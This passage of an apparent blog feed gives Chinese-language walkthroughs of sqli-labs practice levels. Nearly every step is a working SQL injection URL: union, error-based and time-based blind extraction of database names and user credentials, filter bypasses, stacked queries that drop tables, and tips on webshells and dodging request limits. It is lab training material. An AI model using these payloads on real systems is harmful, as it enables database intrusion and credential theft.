http://127.0.0.1/sqlii/Lesss 46/?sort=3 desc     此时结果以第三列的降序进行排列</span><br><span class="line">3. http://127.0.0.1/sqlii/Lesss 46/?sort=3 asc此时的结果以第 三列的升序进行排列，说明在sort位置存在注入漏洞</span><br><span class="line">4. http://127.0.0.1/sqlii/Lesss 46/?sort=left(database() ,1 )这里面显示没有什么反应，那么我们尝试使用延时注入或者是报错</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. http://192.168.169.149:86/Less-46/?sort=3 and updatexml( 1, concat(0x7e, (database() ) ) , 1) --+ 爆出当前使用数据库名称</span><br><span class="line">2. http://192.168.169.149:86/Less-46/?sort=3 and updatexml( 1, concat(0x7e, (select schema_name from information_schema.schemata limit 0,1) ) , 1) --+ 爆出数据库中的第一个值， </span><br></pre></td></tr></table></figure><h1 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.149:86/Less-47/?sort=3 &#x27;  and &#x27;1&#x27;=&#x27;1 </span><br></pre></td></tr></table></figure><h1 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h1><ul><li>不能使用报错注入，要使用基于时间的盲注！</li></ul><h1 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h1><ul><li>使用盲注</li></ul><h1 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.基于时间的盲注</span><br><span class="line">http://127.0.0.1/sqli/Less-50/?sort=1 and if ( (length(database()&gt;1) ,1, sleep(5) )--+</span><br><span class="line"></span><br><span class="line">2.基于报错往入:</span><br><span class="line">http://127.0.0.1/sqli/Less-50/?sort=1 and updatexml( 1, concat(0x7e, (database()) ) ,1) --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.写一句话木马</span><br><span class="line"></span><br><span class="line">4.使用堆叠注入创建删除一个表:</span><br><span class="line">http://127.0.0.1/sqli/Less50/?sort=1; create table crow like users; --+</span><br><span class="line">http://127.0.0.1/sqli/Less50/?sort=1; drop table crow; --+</span><br><span class="line"></span><br><span class="line">5.使用堆叠注入写一句话木马</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个是和less-50唯一不同的地方， 而且可以存在报错回显，我们就可以使用以下几种方法:</span><br><span class="line">1.基于时间的盲注</span><br><span class="line">2.基于报错注入:</span><br><span class="line">3.写一句话木马</span><br><span class="line">4.使用迭代注入创建删除一个表:</span><br><span class="line">5.使用对叠注入写一句话木马</span><br><span class="line">以上方法请参考less50,其他的都是相同的。</span><br></pre></td></tr></table></figure><h1 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们直接看源码中的sql语句SELECT * FROM users ORDER BY 1</span><br><span class="line">这里无法存在报错回显，我们就可以使用以下几种方法:</span><br><span class="line">1.基于时间的盲注</span><br><span class="line">2.写一句话木马</span><br><span class="line">3.使用堆叠注入创建删除一个表:</span><br><span class="line">4.使用堆叠注入写一句话木马</span><br><span class="line">以上方法请参考less50，其他的都是相同的。只是不能够回显错误，所以不能用盲注。</span><br></pre></td></tr></table></figure><h1 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们直接看源码中的sql语句SELECT * FROM users ORDER BY &#x27;1&#x27;</span><br><span class="line">这里无法存在报错回显，我们就可以使用以下几种方法:</span><br><span class="line">1.基于时间的盲注</span><br><span class="line">2.写一句话木马</span><br><span class="line">3.使用堆叠注入创建删除一个表:</span><br><span class="line">4.使用堆叠注入写一句话木马</span><br><span class="line">以上方法请参考less50，其他的都是相同的。只是不能够回显错误，所以不能用盲注。</span><br></pre></td></tr></table></figure><h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>本关中是对输入的次数做了限制，必须在10次请求之内获取信息，否则会刷新表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sql/Less-54/index.php?id=1 返回正常的信息</span><br><span class="line">2. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; 有错误，但是没有回显信息</span><br><span class="line">3. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; --+返回正常</span><br><span class="line">4. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; order by 1  --+返回正常</span><br><span class="line">5. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; order by 4  --+返回错误</span><br><span class="line">6. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; order by 3  --+返回正常，说明存在三列</span><br><span class="line">7. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; union select 1,2,group concat(table_name) from Information_schema_tables where table_schema =0x4348414c4c454e474553  --+  爆出表名，因为我们已经知道数据库的名字是challenges </span><br><span class="line">8. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; union select 1,2,group_concat(column_name) from Information_schema.columns where table._name =0x6a7a3063323772396c38  --+ 取出所有的列名</span><br><span class="line">9. http://127.0.0.1/sql/Less-54/index.php?id=1 &#x27; union select 1,2,group concat( concat ws(0x7e,id,sessid,secret BTL5,tryy))from challenges. jz0c27r9I8 --+取出所有的数据</span><br></pre></td></tr></table></figure><h1 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在14次请求之内获取信息，否则会刷新表名</span><br><span class="line">Ssql=&quot;&#x27;SEL ECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;与less54唯-不同的地方在于id值的处理</span><br><span class="line">1. http://127.0.0.1/sqli/Less-55/?id=1) --+  所以直接按照less54的来即可!</span><br><span class="line">如果在实际环境中遇到这样的情况，次数不够的话，我们可以从ip地址等可能的地方突破，比如更换ip地址等</span><br></pre></td></tr></table></figure><h1 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在14次请求之内获取信息，否则会刷新表名</span><br><span class="line">$sql=“SELECT * FROM security.users WHERE id=&#x27;$id) LIMIT 0,1&quot;;与less55唯一不同的地方在于id值的处理</span><br><span class="line">1. http://127.0.0.1/sqli/less-56/id=1&#x27;)   --+所以直接按照ess54的来即可!</span><br><span class="line">如果在实际环境中遇到这样的情况，次数不够的话，我们可以从ip地址等可能的地方突破，比如更换ip地址等</span><br></pre></td></tr></table></figure><h1 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在14次请求之内获取信息，否则会刷新表名</span><br><span class="line">Sid= “ &quot;.di.&quot;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">与less54唯不同的地方 在于id值的处理</span><br><span class="line">1. http://127.0.0.1/sqli/Less 57/id=1&quot; -- +所以直接按照less54的来即可!</span><br><span class="line">如果在实际环境中遇到这样的情况，次数不够的话，我们可以从ip地址等可能的地方突破，比如更换ip地址等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在5次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=&#x27;1&#x27;</span><br><span class="line">1. 过不断重置数据库发现: </span><br><span class="line">1. http://127.0.0.1/sqli/Less-58/index.php?id=1&#x27; union select 1,2,3 --+这里没有回显数据，所以我们使用union select查询好像没有什么效果</span><br><span class="line">2. http://127.0.0.1/sqli/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from Information_schema.tables where table_schema= 0x4348414c4c454e474553 ),1) --+ 直接爆出表</span><br><span class="line">3. http://127.0.0.1/sqli/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name=&#x27;mk25r38vwy ),1)-+ 直接爆出字段名字</span><br><span class="line">4. http://127.0.0.1/sqli/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret _OHW4) from CHALLENGES.mk25r38vwy ),1)-+得到字段的值</span><br></pre></td></tr></table></figure><h1 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在5次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=1 LIMIT 0,1</span><br><span class="line">这个与less58中不相同的地方大概就在id的处理上，其余的都是相同的。</span><br></pre></td></tr></table></figure><h1 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在5次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=(&quot;1&quot;) LIMIT 0,1</span><br><span class="line">这个与less58中不相同的地方大概就在id的处理.上，其余的都是相同的。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在5次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=((&quot;1“)) LIMIT 0,1</span><br><span class="line">这个与less58中不相同的地方大概就在id的处理.上，其余的都是相同的。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在130次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=(&#x27;1&#x27;) LIMIT 0,1</span><br><span class="line">看到这么多次数，第一时间想到了就是坑爹的延时注入，我们在这里演示一个延时的写法，在后来可能大概不放鸽</span><br><span class="line">子的课程中会写一个</span><br><span class="line">1. http://127.0.0.1/ali/lesss-62/index.php?id=1) and if( (length(database()) = 1) ,1, sleep(5))  --+首先判断数据库的长度</span><br><span class="line">(不过好像已经给出了数据库的名字了。。。。)</span><br><span class="line">2. http://127.0.0.1/sql/Less -62/index.php?id=1) and if( left( (select table_name from information_schema.tables where</span><br><span class="line">table_schema=&#x27;CHALLENGES&#x27; limit 0,1),1)&gt; &#x27;a&#x27; ,1, sleep(5)) --+判断该表的第一位字母是不是比a大</span><br></pre></td></tr></table></figure><h1 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在130次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><h1 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在130次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=‘1’ LIMIT 0,1（也就是这里不一样，这个sql语句可能是错误的，本关请参考视频内容）</span><br></pre></td></tr></table></figure><h1 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本关中是对输入的次数做了限制，必须在130次请求之内获取信息，否则会刷新表名</span><br><span class="line">SELECT * FROM security.users WHERE id=(&quot;1&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs 26a-31</title>
      <link href="/archives/2f30fe91.html"/>
      <url>/archives/2f30fe91.html</url>
      
        <content type="html"><![CDATA[<h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sqli/Less-26a/?id=1 返回数据正常</span><br><span class="line">2. http://127.0.0.1/sqli/Less-26a/?id=1&#x27; 此时没有数据返回</span><br><span class="line">3. http://127.0.0.1/sqli/Less-26a/?id=1&#x27;) ;%00此时我们可以得到返回正常的数据</span><br><span class="line"></span><br><span class="line">4. 代码中  //print_r(mysql_error()); 屏蔽了返回的错误，所以这里我们不能使用报错注入。我们使用联合查询注入</span><br><span class="line"></span><br><span class="line">5. http://127.0.0.1/sqli/Less-26a/?id=111&#x27;) %a0 union %a0 select %a0  1,2,3;%00 直接将所有的空格替换为%a0,根据hint得到可以回显的位置。(特别感谢网络上无偿提供搭建环境的人，感谢您的帮助)</span><br><span class="line">6. http://127.0.0.1/sqli/Less-26a/?id=111&#x27;) %a0 union %a0 select %a0  1,2,group_concat(schema_name)  %a0 from %a0  infoorrmation_schema.schemata     ;%00  获取所有的数据库</span><br><span class="line">7. 记得空格使用%a0进行替换，不要直接复制ppt，因为里面的英文逗号会被转成中文的</span><br></pre></td></tr></table></figure><h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><p>%a0 – 空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. http://121.199.30.46/Less-27/?id=1 有数据</span><br><span class="line">2. http://121.199.30.46/Less-27/?id=1&#x27; 此时报错，说明可能存在注入</span><br><span class="line">3. http://121.199.30.46/Less-27/?id=1&#x27;;%00 成功将单引号进行闭合掉，说明存在注入</span><br><span class="line">4. http://121.199.30.46/Less-27/?id=1&#x27;   %a0 order %a0  by  %a0  3    ;%00  根据hint可以进行这样的order by</span><br><span class="line">5. http://121.199.30.46/Less-27/?id=1&#x27;   %a0 union  %a0  select  %a0 1, 2, 3    ;%00 此时返回错误，我们看下源码</span><br><span class="line"></span><br><span class="line">发现union select等关键字被替换为空，我们尝试大小写混合</span><br><span class="line"></span><br><span class="line">6. http://121.199.30.46/Less-27/?id=1&#x27;   %a0 uNion  %a0  sElect  %a0 1, 2, 3    ;%00 此时返回正常数据</span><br><span class="line"></span><br><span class="line">7. http://121.199.30.46/Less-27/?id=111&#x27;   %a0 uNion  %a0  sElect  %a0 1, 2, group_concat(schema_name)  %a0  from  %a0 information_schema.schemata    ;%00  拿到所有的数据库，一定要留意hint的提示</span><br></pre></td></tr></table></figure><h2 id="使用报错注入"><a href="#使用报错注入" class="headerlink" title="使用报错注入"></a>使用报错注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http://121.199.30.46/Less-27/?id=1&#x27;  %a0 ||    %a0   updatexml(1, concat(0x7e, ( database()  ) ), 1)  %a0  || &#x27;1&#x27;=&#x27;1  首先拿到数据库名称</span><br><span class="line">2. http://121.199.30.46/Less-27/?id=1&#x27;  %a0 ||  updatexml(1, concat(0x7e, (  SEleCt %a0  schema_name  %a0 from  %a0   information_schema.schemata  %a0 limit %a0 1,1  ) ),1)  || %a0  &#x27;1&#x27;=&#x27;1  通过这样查，可以拿到所有的库信息。</span><br><span class="line">3. http://121.199.30.46/Less-27/?id=1&#x27;  %a0 ||  updatexml(1, concat(0x7e, (  SEleCt %a0  table_name  %a0 from  %a0   information_schema.tables %a0 where %a0 table_schema =  0x7365637572697479 %a0 limit %a0 1,1  ) ),1)  || %a0  &#x27;1&#x27;=&#x27;1 通过遍历所有的表的值</span><br><span class="line">4. http://121.199.30.46/Less-27/?id=1&#x27;  %a0 ||  updatexml(1, concat(0x7e, ( SEleCt %a0  column_name %a0  from %a0  information_schema.columns %a0  where %a0   table_name = 0x7573657273  %a0 limit %a0 1,1  ) ),1)  || %a0  &#x27;1&#x27;=&#x27;1 通过遍历取出所以都字段</span><br><span class="line">5. http://121.199.30.46/Less-27/?id=1&#x27;  %a0 ||  updatexml(1, concat(0x7e, ( SElect %a0  concat_ws(0x7e,username,password) from  %a0  security.users  %a0 limit %a0 1,1  ) ),1)  || %a0 &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. http://47.100.118.240:8888/Less-27a/?id=1 有数据</span><br><span class="line">2. http://47.100.118.240:8888/Less-27a/?id=1&#x27; 此时没有报错，我们将显示sql语句的代码加到代码中。</span><br><span class="line">3. http://47.100.118.240:8888/Less-27a/?id=1&quot;;%00  此时显示正常，但是报错的信息不会显示在代码中。</span><br><span class="line">4. http://47.100.118.240:8888/Less-27a/?id=1111&quot; %a0  uNIon  %a0   sElEct  %a0    1,2,3     ;%00 得到数据可以回显的位置。</span><br><span class="line">5. http://47.100.118.240:8888/Less-27a/?id=1111&quot; %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(schema_name) from    %a0  information_schema.schemata     ;%00 取出了所有的库</span><br><span class="line">6. http://47.100.118.240:8888/Less-27a/?id=1111&quot; %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(table_name) from  %a0    information_schema.tables %a0    where  %a0    table_schema = 0x7365637572697479     ;%00 取出了所有的表</span><br><span class="line">7. http://47.100.118.240:8888/Less-27a/?id=1111&quot; %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(column_name) %a0  from %a0 information_schema.columns  %a0 where %a0  table_name = 0x7573657273    ;%00 取出了所有的字段名</span><br><span class="line">8. http://47.100.118.240:8888/Less-27a/?id=1111&quot; %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(concat_ws(0x7e,username,password))  %a0  from  %a0  security.users  ;%00 取出所有的字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="法二：使用基于时间的盲注-其中-26-26-代表-amp-amp"><a href="#法二：使用基于时间的盲注-其中-26-26-代表-amp-amp" class="headerlink" title="法二：使用基于时间的盲注  其中 %26%26 代表 &amp;&amp;"></a>法二：使用基于时间的盲注  其中 %26%26 代表 &amp;&amp;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http://47.100.118.240:8888/Less-27a/?id=1&quot; %26%26 if( length(database())&gt;1, 1, sleep(5)    )  %26%26 %0a  &quot;1&quot;=&quot;1 </span><br><span class="line"></span><br><span class="line">注意：在句子后面不能使用or，因为使用or的情况下，无论如何情况返回都会是真。</span><br><span class="line"></span><br><span class="line">2. http://47.100.118.240:8888/Less-27a/?id=1111&quot; || if( length(database())=1, 1, sleep(5)    )  %26%26  %0a  &quot;1&quot;=&quot;1 这样写也是可以的</span><br></pre></td></tr></table></figure><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">我们在mysql命令行中执行以下命令：</span><br><span class="line"> 1. select * from users ;  显示所有的数据</span><br><span class="line">2. select true ;   返回结果是1，也就是代表正确</span><br><span class="line">3. select false;  返回结果是0，代表着错误</span><br><span class="line">4. select (2  and 1=2); 返回结果是 0</span><br><span class="line">5. select (2  or 1=2);  返回结果是 1</span><br><span class="line">6. select * from users where id=(1); 此时返回第一列数据</span><br><span class="line">7. select * from users where id=(true); 此时返回也是第一列</span><br><span class="line">以上问题说明，我们的id值处理有问题，正确的语句应该是：</span><br><span class="line"> SELECT * FROM users WHERE id=(&#x27;1&#x27;||&#x27;1&#x27;=&#x27;2&#x27;) LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http://47.100.118.240:8888/Less-28/?id=1 显示正常</span><br><span class="line">2. http://47.100.118.240:8888/Less-28/?id=1&#x27; 此时显示不正常，说明可能存在注入漏洞</span><br><span class="line">3. http://47.100.118.240:8888/Less-28/?id=1&#x27;)   ;%00 通过我们添加的代码可以将单引号进行补全。</span><br><span class="line">4. http://47.100.118.240:8888/Less-28/?id=1&#x27;)  %a0 order  %a0  by %a0  3 ;%00 通过order by 和%a0组合得到一共有三列</span><br><span class="line">5. http://47.100.118.240:8888/Less-28/?id=1111&#x27;)  %a0 union   %a0  select  %a0  1,2,3 ;%00 此时可以得到回显位。</span><br><span class="line">6. http://47.100.118.240:8888/Less-28/?id=1111&#x27;)  %a0 union   %a0  select  %a0  1,2,group_concat(schema_name) %a0  from  %a0   information_schema.schemata  ;%00 获得所有的库，与less-27基本相同。</span><br><span class="line">7. http://47.100.118.240:8888/Less-28/?id=111&#x27;)  %a0   union %a0   select %a0  1,2,3    ||  (&#x27;1&#x27;) = (&#x27;1  我们也可以使用or来闭合，这种是不使用;%00的情况。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">法二：基于时间的盲注</span><br><span class="line">1. http://47.100.118.240:8888/Less-28/?id=1&#x27;)  %a0   %26%26 if( length(database())&gt;1, 1, sleep(5)    ) ;%00 </span><br><span class="line">2. http://47.100.118.240:8888/Less-28/?id=1&#x27;)  %a0   %26%26 if( length(database())&gt;1, 1, sleep(5)    )  %26%26  (&#x27;1&#x27;)=(&#x27;1</span><br><span class="line">这两种都是可以的</span><br></pre></td></tr></table></figure><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://47.100.118.240:8888/Less-28a/?id=1 此时显示正常</span><br><span class="line">2. http://47.100.118.240:8888/Less-28a/?id=1&#x27; 有报错，可能存在注入</span><br><span class="line">3. http://47.100.118.240:8888/Less-28a/?id=1&#x27;)  %a0 order  %a0  by %a0  3 ;%00  利用order by语句得到一共有3列。</span><br><span class="line">4. http://47.100.118.240:8888/Less-28a/?id=1111&#x27;) %a0 union   %a0  select  %a0  1,2,3 ;%00  此时得到数据可以显示的位置。</span><br><span class="line">5. http://47.100.118.240:8888/Less-28a/?id=1111&#x27;) %a0 union   %a0  select  %a0  1,2,group_concat(schema_name) %a0  from  %a0   information_schema.schemata ;%00  得到所有的库</span><br><span class="line">6. 其余的操作和less-27基本无异。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">法二：基于时间的盲注</span><br><span class="line">1. http://47.100.118.240:8888/Less-28a/?id=11111&#x27;) %a0  or  %a0   if( length(database())=8, 1, sleep(5)    ) --+</span><br><span class="line">或者是</span><br><span class="line">2. http://47.100.118.240:8888/Less-28a/?id=1&#x27;) %a0  and  %a0   if( length(database())=8, 1, sleep(5)    ) --+  此时要确保前面的id值是可以查到的，不能使用一个不存在的id值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><ol><li>需要搭建jsp服务</li><li>我们可以使用<code>jspstudy</code>在本地搭建，端口设置为8080</li><li>phpstudy端口设置为80</li><li>修改jsp中的文件index.jsp文件的url指向位置到你安装sqli-labs中的less29下</li><li>不然就和第一关没什么两样</li></ol><hr><ul><li>服务器两层架构<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http参数污染：jsp/tomcat使用getgetParameter(&quot;id&quot;)获取到的是第一个值，php/apache使用$_GET[&quot;id&quot;]获取的是第二个值，那么第一个id纯数字，第二个id的值</span><br></pre></td></tr></table></figure></li></ul><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1:8080/sqli_/Less-29/index.jsp?id=1&amp;id=3&#x27;  order by 3--+ 说明数据有3列，而且第一个id值无法注入</span><br><span class="line">2. http://127.0.0.1:8080/sqli_/Less-29/index.jsp?id=1&amp;id=113&#x27;  union select 1,2, 3  --+ 已经知道数据回显的位置</span><br><span class="line">3. http://127.0.0.1:8080/sqli_/Less-29/index.jsp?id=1&amp;id=113&#x27;  union select 1,2, group_concat(schema_name) from    information_schema.schemata --+  此时我们已经取出数据库的名字。</span><br><span class="line">4. 接下来就是常规的操作，和less1基本一致</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1:8080/sqli_/Less-30/index.jsp?id=1&amp;id=1&quot; order by 3--+  